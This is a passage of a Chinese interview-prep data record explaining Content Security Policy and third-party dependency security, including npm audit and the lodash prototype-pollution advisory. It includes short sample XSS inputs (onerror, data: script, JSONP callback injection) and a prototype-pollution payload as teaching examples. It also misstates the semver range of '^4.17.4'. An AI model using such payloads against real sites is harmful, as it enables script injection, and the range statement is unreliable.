2.1 资源加载限制\n\n以下选项限制各类资源的加载。\n\n-   `script-src`：外部脚本\n-   `style-src`：样式表\n-   `img-src`：图像\n-   `media-src`：媒体文件（音频和视频）\n-   `font-src`：字体文件\n-   `object-src`：插件（比如 `Flash`）\n-   `child-src`：框架\n-   `frame-ancestors`：嵌入的外部资源（比如`<frame>`、`<iframe>`、`<embed>`和`<applet>`）\n-   connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）\n-   worker-src：worker脚本\n-   manifest-src：manifest 文件\n\n### 2.2 `default-src`\n\ndefault-src用来设置上面各个选项的默认值。\n\n```arduino\nContent-Security-Policy: default-src 'self'\n```\n\n上面代码限制所有的外部资源，都只能从当前域名加载。\n\n如果同时设置某个单项限制（比如`font-src`）和`default-src`，前者会覆盖后者，即字体文件会采用`font-src`的值，其他资源依然采用`default-src`的值。\n\n### 2.3 `URL` 限制\n\n有时，网页会跟其他 `URL` 发生联系，这时也可以加以限制。\n\n-   `frame-ancestors`：限制嵌入框架的网页\n-   `base-uri`：限制`<base#href>`\n-   `form-action`：限制`<form#action>`\n\n### 2.4 其他限制\n\n其他一些安全相关的功能，也放在了 `CSP` 里面。\n\n-   `block-all-mixed-content`：`HTTPS` 网页不得加载 `HTTP` 资源（浏览器已经默认开启）\n-   `upgrade-insecure-requests`：自动将网页上所有加载外部资源的 `HTTP` 链接换成 `HTTPS` 协议\n-   `plugin-types`：限制可以使用的插件格式\n-   `sandbox`：浏览器行为的限制，比如不能有弹出窗口等\n\n### 2.5 `report-uri`\n\n有时，我们不仅希望防止 `XSS`，还希望记录此类行为。`report-uri`就用来告诉浏览器，应该把注入行为报告给哪个网址。\n\n```css\nContent-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;\n```\n\n上面代码指定，将注入行为报告给`/my_amazing_csp_report_parser`这个 `URL`。\n\n浏览器会使用`POST`方法，发送一个`JSON`对象，下面是一个例子。\n\n```json\n{\n  \"csp-report\": {\n    \"document-uri\": \"http://example.org/page.html\",\n    \"referrer\": \"http://evil.example.com/\",\n    \"blocked-uri\": \"http://evil.example.com/evil.js\",\n    \"violated-directive\": \"script-src 'self' https://apis.google.com\",\n    \"original-policy\": \"script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser\"\n  }\n}\n```\n\n![](https://static.ecool.fun//article/27731a3a-f511-4493-9714-88bd4a9d697e.awebp)\n\n## 三、`Content-Security-Policy-Report-Only`\n\n除了`Content-Security-Policy`，还有一个`Content-Security-Policy-Report-Only`字段，表示不执行限制选项，只是记录违反限制的行为。\n\n它必须与`report-uri`选项配合使用。\n\n```css\nContent-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser\n```\n\n## 四、选项值\n\n每个限制选项可以设置以下几种值，这些值就构成了白名单。\n\n-   主机名：`example.org，https://example.com:443`\n-   路径名：`example.org/resources/js/`\n-   通配符：`*.example.org，*://*.example.com:*`（表示任意协议、任意子域名、任意端口）\n-   协议名：`https:、data:`\n-   关键字`'self'`：当前域名，需要加引号\n-   关键字`'none'`：禁止加载任何外部资源，需要加引号\n\n多个值也可以并列，用空格分隔。\n\n```less\nContent-Security-Policy: script-src 'self' https://apis.google.com\n```\n\n如果同一个限制选项使用多次，只有第一次会生效。\n\n```bash\n# 错误的写法\nscript-src https://host1.com; script-src https://host2.com\n\n# 正确的写法\nscript-src https://host1.com https://host2.com\n```\n\n如果不设置某个限制选项，就是默认允许任何值。\n\n## 五、script-src 的特殊值\n\n除了常规值，`script-src`还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。\n\n-   `'unsafe-inline'`：允许执行页面内嵌的`&lt;script>`标签和事件监听函数\n-   `unsafe-eval`：允许将字符串当作代码执行，比如使用`eval、setTimeout、setInterval`和`Function`等函数。\n-   `nonce`值：每次`HTTP`回应给出一个授权`token`，页面内嵌脚本必须有这个`token`，才会执行\n-   `hash`值：列出允许执行的脚本代码的`Hash`值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。\n\n`nonce`值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的`token`。\n\n```css\nContent-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'\n```\n\n页面内嵌脚本，必须有这个`token`才能执行。\n\n```xml\n<script nonce=EDNnf03nceIOfn39fn3e9h3sdfa>\n  // some code\n</script>\n```\n\nhash值的例子如下，服务器给出一个允许执行的代码的hash值。\n\n```css\nContent-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='\n```\n\n下面的代码就会允许执行，因为hash值相符。\n\n```xml\n<script>alert('Hello, world.');</script>\n```\n\n注意，计算`hash`值的时候，`<script>`标签不算在内。\n\n除了`script-src`选项，`nonce`值和`hash`值还可以用在`style-src`选项，控制页面内嵌的样式表。\n\n## 六、注意点\n\n（1）`script-src`和`object-src`是必设的，除非设置了`default-src`。\n\n因为攻击者只要能注入脚本，其他限制都可以规避。而`object-src`必设是因为 `Flash` 里面可以执行外部脚本。\n\n（2）`script-src`不能使用`unsafe-inline`关键字（除非伴随一个`nonce`值），也不能允许设置`data:URL`。\n\n下面是两个恶意攻击的例子。\n\n```ini\n<img src=\"x\" onerror=\"evil()\">\n<script src=\"data:text/javascript,evil()\"></script>\n```\n\n（3）必须特别注意 `JSONP` 的回调函数。\n\n```scss\n<script\nsrc=\"/path/jsonp?callback=alert(document.domain)//\">\n</script>\n```\n\n上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。",
    "testPoint": "### **1. CSP 的基本概念**\n#### **问题**：\n- 什么是 Content Security Policy（CSP）？\n- CSP 的主要目的是什么？它主要防御哪些类型的攻击？\n- CSP 的核心思想是什么？\n\n**关键点**：\n- CSP 是一种安全机制，用于防止 XSS（跨站脚本攻击）和数据注入等攻击。\n- 它通过限定资源的加载源来保护网页安全。\n\n---\n\n### **2. CSP 的工作原理**\n#### **问题**：\n- CSP 是如何工作的？它的基本流程是什么？\n- CSP 的声明方式有哪些？如何通过 HTTP Header 或 `<meta>` 标签配置 CSP？\n- 浏览器如何响应 CSP 策略的违规行为？\n\n**关键点**：\n- 通过 HTTP 响应头的 `Content-Security-Policy` 或 HTML 中的 `<meta http-equiv=\"Content-Security-Policy\" content=\"...\">` 声明。\n- 浏览器会阻止加载与 CSP 策略不匹配的资源，并在控制台输出相关警告。\n\n---\n\n### **3. CSP 的配置与规则**\n#### **问题**：\n- CSP 中的常见指令有哪些？分别有什么作用？\n  - `default-src`：默认资源加载策略。\n  - `script-src`：限制脚本加载来源。\n  - `style-src`：限制样式表来源。\n  - `img-src`：限制图片来源。\n  - `connect-src`：限制 AJAX 请求和 WebSocket 连接来源。\n  - `frame-src` 和 `child-src`：限制 iframe 内容来源。\n- 什么是 `nonce` 和 `hash`？它们在 CSP 中的作用是什么？\n- 如何配置 CSP 以允许特定的第三方资源？\n\n**示例**：\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline';\n```\n**解析**：\n- 仅允许来自当前域名的资源加载。\n- 脚本资源需要携带特定的 `nonce`。\n- 样式资源允许使用内联样式（`unsafe-inline`）。\n\n---\n\n### **4. CSP 的安全保障**\n#### **问题**：\n- CSP 如何防御 XSS 攻击？与其他防御方法相比有什么优势？\n- 如果配置不当，CSP 是否可能带来新的安全问题？\n- CSP 能否完全阻止所有类型的 XSS 攻击？为什么？\n\n**关键点**：\n- CSP 限制了资源的加载来源，但无法防止逻辑上的漏洞。\n- CSP 必须结合其他安全措施（如输入验证、输出编码等）才能构建完整的防护体系。\n\n---\n\n### **5. CSP 的常见问题**\n#### **问题**：\n- 什么是 `unsafe-inline` 和 `unsafe-eval`？为什么不建议使用它们？\n- 如果某些第三方库（如 Google Analytics）不兼容 CSP，如何处理？\n- 浏览器不支持 CSP 时，如何应对？\n\n**关键点**：\n- 使用 `nonce` 或 `hash` 替代 `unsafe-inline`。\n- 针对第三方库，可通过策略放宽特定资源的加载限制。\n- 对于不支持 CSP 的浏览器，可辅以其他安全机制。\n\n---\n\n### **6. CSP 的实践应用**\n#### **问题**：\n- 在实际项目中，如何配置 CSP 来保护站点？\n- 如何逐步部署 CSP 策略以避免影响正常功能？\n- 项目中是否使用过 **CSP Report**？如何通过报告分析和优化策略？\n\n**关键点**：\n- 开始时可以使用 `Content-Security-Policy-Report-Only` 来监控 CSP 策略是否有影响。\n- 配置 `report-uri` 或 `report-to` 收集违规日志。\n\n---\n\n### **7. CSP 的限制与挑战**\n#### **问题**：\n- CSP 对开发流程有什么影响？可能带来哪些额外的工作量？\n- 如何应对 CSP 对某些动态功能（如动态脚本加载）的限制？\n- 在前后端分离项目中，如何设计 CSP 策略？\n\n---\n\n### **8. 场景化问题**\n#### **问题**：\n- 如果你的网站使用了一些内联脚本（如 `<script>` 中直接包含代码），如何配置 CSP 以避免报错？\n- 如果一个外部广告服务需要加载第三方脚本，而你又不信任它，如何配置 CSP？\n- 有人抱怨某些功能在启用 CSP 后失效，如何排查问题？\n\n---\n\n### **9. CSP 与现代前端架构**\n#### **问题**：\n- 在单页应用（SPA）中，如何动态管理 CSP 策略？\n- 如果使用了 Webpack 动态加载资源，如何让 CSP 与之兼容？\n- 在支持 HTTP/3 的项目中，CSP 是否有特殊配置需求？",
    "exerciseKeyList": "[\"d7b4d0ce-dc04-4989-9244-88276318b6db\",\"330533b2-c523-486a-b2f5-8b10cb6e6173\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-02T03:25:14.000Z",
    "updateAt": "2024-12-03T14:41:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "330533b2-c523-486a-b2f5-8b10cb6e6173",
        "title": "CSP（Content Security Policy）可以解决什么问题?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:37:59.000Z",
        "updateAt": "2024-08-10T17:07:19.000Z"
      },
      {
        "exerciseKey": "d7b4d0ce-dc04-4989-9244-88276318b6db",
        "title": "HTTP Request Header和Response Header里面分别都有哪些比较重要的字段",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:48:34.000Z",
        "updateAt": "2024-07-19T18:15:52.000Z"
      }
    ]
  },
  "36": {
    "id": 36,
    "tagId": 21,
    "title": "第三方库的安全",
    "explanation": "## 从一个安全漏洞说起\n\n![](https://static.ecool.fun//article/d755ccaa-8c66-47c2-8a53-64cc4f5e3536.awebp)\n\n`Lodash` 是一款非常流行的 `npm` 库，每月的下载量超过 `8000` 万次，`GitHub` 上使用它的项目有超过 `400` 万。之前有段时间， `Lodash` 的一个安全漏洞刷爆了朋友圈，我们先来回忆下这个安全漏洞：\n\n攻击者可以通过 `Lodash` 的一些函数覆盖或污染应用程序。例如：通过 `Lodash` 库中的函数 `defaultsDeep` 可以修改 `Object.prototype` 的属性。\n\n![](https://static.ecool.fun//article/8c1a9fb9-21a3-433d-b214-f37069411779.awebp)\n\n我们都知道，`JavaScript` 在读取对象中的某个属性时，如果查找不到就会去其原型链上查找。试想一下，如果被修改的属性是 `toString` 方法：\n\n```js\nconst payload = '{\"constructor\": {\"prototype\": {\"toString\": true}}}'\n_.defaultsDeep({}, JSON.parse(payload))\n```\n\n每个对象都有一个 `toString()` 方法，当该对象被表示为一个文本值时，或者一个对象以预期的字符串方式引用时自动调用。默认情况下，`toString()` 方法被每个 `Object` 对象继承。如果此方法在自定义对象中未被覆盖，`toString()` 返回 `[object type]`，其中 `type` 是对象的类型。如果覆盖了 `toString()` 方法，那么给应用带来的影响就是非常大的。\n\n其实上述的问题就属于一个很常见的安全漏洞 —— 原型污染\n\n> 原型污染：攻击者通过某种手段修改 JavaScript 对象的原型（prototype）\n\n然而这并不是 `Lodash` 第一次爆出安全漏洞了。事实上，像这样的安全漏洞还可能存在于我们使用的千千万万个不同的开源依赖中，如果我们平时不重视他们，一旦出现问题对我们的项目造成的损失是不可估计的。这相当于你的项目中埋着很多不知道什么时候就会爆炸的炸弹。\n\n## 安全调查\n\n其实开发人员对开源代码的安全性的信任程度要大于对自己编写的代码的安全性的信任程度，但是在确保代码安全性和质量的工具还有很多不足之处。在 `npm` 还没有一个完善的安全检测机制之前，`npm` 和 `NodeJs` 团队曾经对数万名 `JavaScript` 开发者发起过一个调查，第一个问题就是安全问题，具体就是开发人员如何看待他们编写的代码和所使用的开源项目的安全性。\n\n调查结果显示：全球 `97％` 的 `JavaScript` 开发人员在自己开发的项目中都依赖开源代码，`77％` 的开发人员对他们使用的开源代码是否安全表示担忧。更有趣的是，有 `87％` 的人表示担心自己的代码的安全性。\n\n![](https://static.ecool.fun//article/c7480310-dc29-4f1e-bebe-8096ed2c706c.awebp)\n\n另外，超过一半的 `JavaScript` 开发人员认为，他们用来评估开源代码的安全性和质量的工具还不够好。\n\n![](https://static.ecool.fun//article/78aa21ea-db16-45b8-bcfc-74305a22f0bc.awebp)\n\n## npm audit\n\n![](https://static.ecool.fun//article/fc67792b-565a-4020-a9bd-0bc788f11f59.awebp)\n\n基于上面的不太乐观的调查结果，`npm@6` 增加了一项重大更新：`npm audit` 命令。从上面的 `logo` 就可以看出，这个版本是主打安全性。 `npm audit` 命令会递归地分析依赖关系树以识别不安全的依赖，如果你在项目中使用了具有已知安全问题的依赖，就收到警告通知。该命令会在你更新或者安装了新的依赖包后自动运行。\n\n`npm` 官方专门维护了一个漏洞列表，当开发者或者专业的安全团队发现某个依赖包存在安全问题后就会上报给 `npm` 官方，然后官方会通知该项目开发者进行修复，修复完成后 `npm` 会把漏洞详细的描述信息、解决方案发布出来：\n\n![](https://static.ecool.fun//article/840e0e51-b0f5-4399-98bc-ced9ffdfcfcf.awebp)\n\n`npm aduit` 主要做的就是把需要检查的依赖信息发送给一个官方检查接口, 该结构会在历史上报的漏洞数据库中判断当前依赖信息是否含有漏洞，然后生成一个包含包名称、漏洞严重性、简介、路径等的漏洞报告反馈给开发者。\n\n我们现在直接安装一个具有安全漏洞的 `lodash@4.17.4` 版本，可见安装完成后会提醒你你刚刚增加的依赖中含有3个漏洞。\n\n![](https://static.ecool.fun//article/15de534e-88f0-4773-b48a-86686eb7ead8.awebp)\n\n执行 `npm audit` 我们可以看到漏洞详情，这个版本的 `lodash` 存在3个安全漏洞，我们来具体看一个：\n\n![](https://static.ecool.fun//article/f5c5f723-5374-419c-8f71-9b055ce8e8ec.awebp)\n\n-   `High`: 表安全漏洞等级\n-   `Package`: 存在漏洞的包名称\n-   `Dependency of`: 当前工程直接依赖的包名称\n-   `Path`: 漏洞完整依赖路径\n-   `More info`: 漏洞详情\n\n这里注意，并不只是直接依赖的包具有漏洞才会收到提醒，而是只要是你的依赖树中某一个节点依赖依赖了具有漏洞的包你就会收到提醒，来看看下面的例子：\n\n项目中并非直接依赖了 `lodash` ，而是 `@commitlint/cli` 依赖的 `@commitlint/load` 中依赖了 `lodash` 就会算作一个漏洞，所以一些庞大的迭代周期很长的项目含有几万个安全漏洞也是很正常的。\n\n![](https://static.ecool.fun//article/95f82b27-0b0f-4bda-a9f2-b316e895cd0b.awebp)\n\n点开漏洞详情的链接：`https://www.npmjs.com/advisories/1065`\n\n![](https://static.ecool.fun//article/470cd195-c163-40bd-85dd-dd4ae050c930.awebp)\n\n我们可以看到漏洞具体说明，以及解决方法，右侧是该漏洞的具体上报时间，漏洞公开时间。\n\n## GitHub 安全板块\n\n平时我们可能经常会收到类似如下的 `GitHub` 安全漏洞提醒的邮件。\n\n![](https://static.ecool.fun//article/f23cef9e-9b86-4176-a0ab-f6d9d66651f4.awebp)\n\n打开链接，我们可以看到漏洞具体的详情页面：\n\n![](https://static.ecool.fun//article/40afd4cb-3690-458a-aa14-1ef94f8bcba4.awebp)\n\n`GitHub` 单独为它开辟了一个，`Security` 板块来展示 `GitHub` 检测到的依赖安全漏洞，可见这些漏洞是足够引起大家重视并且需要快速修复的：\n\n![](https://static.ecool.fun//article/34c7c1fe-b23c-4f46-a71f-673c84f15af2.awebp)\n\n另外，`GitHub` 还为每个可修复的漏洞提供了一键修复的功能，点击 `Automated security updates` 按钮，`GitHub` 会自动将这些依赖漏洞修复，并提交一个 `Pull Request` 给你的仓库：\n\n![](https://static.ecool.fun//article/6ab984f5-8c20-4d7e-a1e8-821bedd745d2.awebp)\n\n## 安全漏洞修复策略\n\n`npm` 也提供了 `npm audit fix` 命令来帮助我们自动修复漏洞，还继续使用上面的例子， `Lodash` 在 `4.17.12` 版本之前都具有原型污染漏洞，下面我们来看看具体的修复策略：\n\n### 直接依赖漏洞\n\n当前我们直接依赖了一个具有安全漏洞的 `lodash@4.17.4` 版本：\n\n```json\n  \"dependencies\": {\n    \"lodash\": \"^4.17.4\"\n  }\n```\n\n由于 `^4.17.4` 的依赖范围是 `>=3.0.3 < 4.0.0`，已修复的版本 `4.17.12` 在这个范围内，那么实际上 `npm audit fix` 执行的逻辑就是 `npm update lodash@4.17.12`。\n\n```bash\nlodash@^4.17.4 -> lodash@^4.17.12\n```\n\n### 间接依赖漏洞\n\n假设我们现在的依赖路径非常深： `@commitlint/cli^7.1.2>@commitlint/load^1.0.1>lodash^3.0.0`\n\n![](https://static.ecool.fun//article/c2708d32-dca4-4763-9971-baefa21cd44f.awebp)\n\n因为 `@commitlint/load` 对 `lodash` 的依赖是`^3.0.0(>=3.0.0 <4.0.0)`，`4.17.12` 不在这个范围，所以我们不能直接通过升级 `Lodash` 来修复漏洞，这时我们就要向上层依赖进行分析。\n\n假设此时 `@commitlint/load` 有一个更新版本 `@commitlint/load^1.0.2` 对 `lodash` 的依赖是`^4.0.0(>=4.0.0 <5.0.0)`，`lodash@4.17.12` 在这个依赖范围内，那么修复策略为 `npm update @commitlint/load@1.0.2 --depth=2`。\n\n> npm update 只会检查更新顶层的依赖，更新更深层次的依赖版本需要使用 --depth 指定更新的深度。\n\n按照这个逻辑，如果 `@commitlint/load` 也没有找到可以升级的包，那么再到上层依赖查找，直到找到可以修复漏洞的那个层级的依赖。\n\n### 强制修复漏洞\n\n按照上面的策略，从底层依赖一直向上层查找，如果一直到最上层依赖才有符合要求的修复版本，那么就直接 `npm update` 更新最顶层依赖。\n\n继续使用上面的例子，如果 `@commitlint/cli^7.1.2( >=7.1.2 <8.0.0 )` 还不能找到一个可修复的版本，那么 `npm audit fix` 这个命令就无能为力了。\n\n这时我们可以尝试 `npm audit fix --force`（强制执行 audit fix 安装最新的依赖项（toplevel））来进行修复，这个逻辑就是：`npm install @commitlint/cli@patchedVersion --save`\n\n> 这个命令会直接跨越当前指定的 `semver` 版本范围，强制将依赖更新到最新版本，一定要谨慎使用。\n\nnpm 还提供了一些其他的修复命令命令\n\n-   `npm audit fix --package-lock-only`：在不修改 `node_modules` 的情况下执行 `audit fix`，仍然会更改 `pkglock`\n-   `npm audit fix --only=prod`：跳过更新 `devDependencies`\n\n### 不可修复漏洞\n\n当然，以上的修复策略都不能解决这个安全漏洞，那说明此漏洞是无法自动修复的，需要人工判定处理。\n\n## 关闭安全检查\n\n如果你对这些安全漏洞不 care，你也可以手动指定一些配置来关闭这些安全检查：\n\n-   安装单个包关闭安全审查: `npm install example-package-name --no-audit`\n-   安装所有包关闭安全审查 - 运行 `npm set audit false`\n-   手动将 `~/.npmrc` 配置文件中的 `audit` 修改为 `false`\n\n> 当然，强烈不推荐这么做，一定要对自己开发的项目负责到底～\n\n## 解读依赖漏洞报告\n\n执行 `npm audit --json` 将会打印出一个详细的 `json` 格式的安全报告，在这个报告里可以看到这些漏洞的详情，以及具体的漏洞修复策略。\n\n由于这个 `JSON` 比较大，我就不直接贴在这里了，大家可以选择一个项目到本地执行 `npm audit --json` 查看。\n\n### 漏洞数据总览\n\n在 `metadata` 属性中：我们可以看到漏洞检查的数据总览：\n\n```json\n  {\n    \"vulnerabilities\": {\n      \"info\": 0,\n      \"low\": 0,\n      \"moderate\": 4,\n      \"high\": 29,\n      \"critical\": 0\n    },\n    \"dependencies\": 18594,\n    \"devDependencies\": 891090,\n    \"optionalDependencies\": 9514,\n    \"peerDependencies\": 0,\n    \"totalDependencies\": 909785\n  }\n```\n\n`vulnerabilities` 中展示了每种等级漏洞的数量，`info`、`low`、`moderate`、`high`、`critical` 从左到右对应的安全漏洞等级从低到高。\n\n下面是每种依赖的检测数量，就是我们熟悉的 `dependencies`、`devDependencies` 等等。\n\n### 修复策略\n\n在 `actions` 属性中，会列出所有可漏洞的修复策略，例如下面的，对 `@commitlint/load` 执行更新，深度为 `2` ，以修复 `@commitlint/cli>@commitlint/load>lodash` 这条路径上的漏洞：\n\n```json\n{\n      \"action\": \"update\",\n      \"module\": \"@commitlint/load\",\n      \"target\": \"1.0.2\",\n      \"resolves\": [\n        {\n          \"id\": 1184,\n          \"path\": \"@commitlint/cli>@commitlint/load>lodash\",\n          \"dev\": false,\n          \"optional\": false,\n          \"bundled\": false\n        }\n      ],\n      \"depth\": 2\n    }\n```\n\n另外，`action` 还有我们上面提到的其他几种操作：\n\n-   `install`(修复直接依赖)\n-   `install major`(强制升级依赖，跨越主版本)\n-   `review`(不可自动修复，需要人工review)\n\n### 漏洞详情\n\n`advisories` 属性存放了每个漏洞的详情：\n\n```json\n\"1065\": {\n      \"cves\": [\n        \"CVE-2019-10744\"\n      ],\n      \"access\": \"public\",\n      \"severity\": \"high\",\n      \"metadata\": \"\",\n      \"reviewers\": \"\",\n      \"confirmors\": \"\",\n      \"id\": 1065,\n      \"repo_from\": \"npm\",\n      \"title\": \"Prototype Pollution\",\n      \"module_name\": \"lodash\",\n      \"found_by_link\": \"\",\n      \"found_by_user_name\": \"Snyk Security Team\",\n      \"reported_by_link\": \"\",\n      \"reported_by_user_name\": \"Snyk Security Team\",\n      \"vulnerable_versions\": \"<4.17.12\",\n      \"patched_versions\": \">=4.17.12\",\n      \"overview\": \"Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\\n\\n\",\n      \"recommendation\": \"Update to version 4.17.12 or later.\",\n      \"references\": \"- [Snyk Advisory](https://snyk.io/vuln/SNYK-JS-LODASH-450202)\",\n      \"cwe\": \"CWE-471\",\n      \"url\": \"https://npmjs.com/advisories/1065\",\n      \"gmt_create\": \"2019-07-16T02:28:32.000Z\",\n      \"gmt_modified\": \"2019-09-11T04:49:11.000Z\",\n      \"deleted_at\": null,\n      \"findings\": [\n        {\n          \"version\": \"4.17.11\",\n          \"paths\": [\n            \"@commitlint/cli>@commitlint/load>@commitlint/rules>@commitlint/ensure>lodash\",\n            \"@commitlint/cli>@commitlint/load>lodash\",\n            \"@commitlint/cli>@commitlint/load>@commitlint/resolve-extends>lodash\",\n            \"@commitlint/cli>@commitlint/load>lodash\",\n            \"@commitlint/cli>lodash\"\n          ],\n          \"dev\": true,\n          \"optional\": false,\n          \"bundled\": false\n        }\n      ]\n    }\n```\n\n由于属性比较多，我们挑几个重点的来看看：\n\n-   `cves`：CVE漏洞编号\n-   `severity`：漏洞等级\n-   `found_by_user_name`：发现该漏洞的用户（这里 `Snyk Security Team` 是一个知名的安全团队）\n-   `vulnerable_versions`：受影响的版本\n-   `patched_versions`：已修复的版本\n-   `findings`：所有依赖此路径的漏洞\n-   `overview`：漏洞的简要说明，这里就提到了 `Lodash` 的 `defaultsDeep` 容易收到原型污染\n-   `references`：漏洞参考，一般是由某些专业安全平台发布的报告\n\n## 安全平台\n\n上面的报告中提到了几个专业的安全平台，容易让人产生迷惑，我们下面来具体看一下：\n\n### HackerOne\n\n![](https://static.ecool.fun//article/dd2fef32-f31f-4056-8f25-b570bf26ddaa.awebp)\n\n`HackerOne（http://hackerone.com）`成立于 `2012` 年，是一个安全漏洞聚合和披露平台，黑客可以在网站上披露自己发现的安全漏洞、并报告给相关的网站或公司，这些网站或公司在确认后可以给黑客提供奖金等各类感谢。`HackerOne` 平台的注册黑客人数已突破 `30` 万人，提交的有效漏洞总计超过 `10` 万个，支付的漏洞奖励金超过 `4200` 万美元。\n\n![](https://static.ecool.fun//article/b5d95c22-66df-4092-b6fb-c0edff7834c7.awebp)\n\n```json\n\"references\": \"- [HackerOne Report](https://hackerone.com/reports/541502)\"\n```\n\n我们可以在安全报告中看到，某些漏洞还会有一份 `HackerOne` 的漏洞报告做为参考。\n\n### Snyk\n\n![](https://static.ecool.fun//article/edacbbc8-7e3f-4cb4-b0cd-84bdbdb19783.awebp)\n\n`Snyk` 是用于多个开发堆栈的依赖关系分析平台，涵盖 `JavaScript，Java，.Net，Ruby，Python，PHP，Golang` 和 `Scala`。 `Snyk` 维护着一个全面的，开放源代码漏洞数据库，其中包括 `Snyk` 自己的专门研究团队发现的漏洞，以及从公共数据源跟踪的漏洞。\n\n`Snyk` 的漏洞数据库通过其威胁情报系统提供有关漏洞的全面数据，提供更好的覆盖范围，并能够显示和报告尚未收到 `CVE` 的漏洞。例如，`npm` 提示的漏洞中有 `72％` 是先被添加到 `Snyk` 数据库里的。\n\n`Snyk` 同样也提供了扫描安全漏洞的机制，相比 `npm audit`，它的优势是可以很容易和 `GitHub` 或 `GitLab` 的 `CI` 流程集成在一起，更多扫描机制上的对比，可以看看这篇文章：`https://www.nearform.com/blog/comparing-npm-audit-with-snyk/`。\n\n![](https://static.ecool.fun//article/e2c88820-d737-4170-a7d8-49e174dd6a20.awebp)\n\n```json\n\"references\": \"- [Snyk Advisory](https://snyk.io/vuln/SNYK-JS-LODASH-450202)\"\n```\n\n我们可以在上面的安全报告中看到，某些漏洞还会有一份 `Snyk` 的漏洞报告做为参考，并且 `Lodash` 这个安全漏洞也是由 `Snyk` 安全团队发现并上报的。\n\n### CVE\n\n![](https://static.ecool.fun//article/d17f0971-4930-492c-bf1e-01fbc935c6a2.awebp)\n\n`CVE` 代表着通用漏洞和披露的标准, 这是一个由联邦政府赞助的研究和开发中心的非营利组织。它的目的是识别软件或固件中的漏洞并将其编目到一个免费的数据库中, 以提高组织的安全性。\n\n用 `CVE ID` 标识特定漏洞或暴露, 组织可以快速准确地从各种 `CVE` 兼容的信息源中获取信息。通过在不同安全工具和服务之间的进行比对, `CVE` 可以帮助组织选择最适合其需要的内容。\n\n```json\n\"cves\": [\n        \"CVE-2019-10744\"\n      ]\n```\n\n![](https://static.ecool.fun//article/f72440bb-c35b-4bae-ba67-671d804a06b6.awebp)\n\n![](https://static.ecool.fun//article/557dea01-7535-4910-b29c-16dd881600ce.awebp)\n\n我们可以看到，不论是上面的 `npm audit` 报告还是 `Snyk`、`HackerOne` 等其他的安全平台的报告都会附上一个漏洞的 `CVE` 编号。\n",
    "testPoint": "### **1. 基本概念**\n#### **问题**：\n- 使用第三方库可能带来哪些安全风险？\n- 为什么前端项目需要关注第三方库的安全性？\n- 你如何看待 “依赖即技术债” 的说法？\n\n**关键点**：\n- 第三方库风险包括已知漏洞、恶意代码注入、版本不一致、依赖链攻击等。\n- 项目中引入库的数量越多，风险暴露面越广，且增加维护成本。\n\n---\n\n### **2. 常见安全风险**\n#### **问题**：\n- 什么是 **供应链攻击**，它如何影响前端项目？\n- 第三方库中可能存在哪些已知漏洞？\n- 使用未经验证的小型库可能带来什么样的安全隐患？\n\n**关键点**：\n- **供应链攻击**：\n  - 攻击者通过污染依赖库或其更新流程（如 NPM 发布）植入恶意代码。\n  - 例如：`event-stream` 事件污染事件。\n- **已知漏洞**：\n  - 如跨站脚本（XSS）、敏感数据泄露等。\n- 小型库的隐患：\n  - 作者停止维护导致漏洞无法及时修复。\n\n---\n\n### **3. 依赖管理**\n#### **问题**：\n- 如何管理项目中的依赖版本，避免安全风险？\n- 你如何检查项目依赖中是否存在漏洞？\n- 当发现一个库有漏洞时，你会如何处理？\n\n**关键点**：\n- 锁定依赖版本，避免意外升级：\n  - 使用 `package-lock.json` 或 `yarn.lock`。\n- 定期检查漏洞：\n  - 工具：`npm audit`、`yarn audit`、`Snyk` 等。\n- 处理漏洞：\n  - 升级依赖版本。\n  - 若无法升级，寻找替代库或手动修复。\n\n---\n\n### **4. 第三方库的安全评估**\n#### **问题**：\n- 在选择第三方库时，你会考虑哪些安全因素？\n- 你如何评估一个第三方库的可靠性和安全性？\n- 使用一个未经维护的库，但短期无法替代时，你会如何应对？\n\n**关键点**：\n- 选择库时考虑：\n  - 社区活跃度（GitHub stars/issues/prs）。\n  - 维护频率（最近更新时间）。\n  - 是否提供签名或验证机制（如代码完整性校验）。\n- 应对旧库：\n  - 评估使用范围并限制风险。\n  - 优先限制对敏感操作的调用。\n\n---\n\n### **5. 防范措施**\n#### **问题**：\n- 什么是 **Subresource Integrity (SRI)**，它如何帮助防范第三方库风险？\n- 你会如何设计系统来降低第三方库带来的攻击面？\n- 如果你需要使用一个未经验证的第三方库，你会采取哪些额外的安全措施？\n\n**关键点**：\n- **Subresource Integrity (SRI)**：\n  - 通过校验文件的哈希值，确保文件未被篡改。\n  - 示例：\n    ```html\n    <script src=\"https://cdn.example.com/lib.js\" integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxP3a8nLPOkEFp8nEB2KfR42ErYd6k\" crossorigin=\"anonymous\"></script>\n    ```\n- 降低攻击面：\n  - 使用 CDNs 提供的库进行隔离。\n  - 将第三方代码的执行权限限制在沙箱环境中。\n\n---\n\n### **6. 实践经验**\n#### **问题**：\n- 你是否处理过因第三方库引发的安全问题？具体是如何发现和解决的？\n- 你是否参与过供应链攻击的预防或处理？\n- 你是否遇到过依赖树中的间接库漏洞？如何解决？\n\n**关键点**：\n- 优秀的候选人能够描述真实案例，并展示在风险管理中的主动性。\n\n---\n\n### **7. 场景化问题**\n#### **问题**：\n- 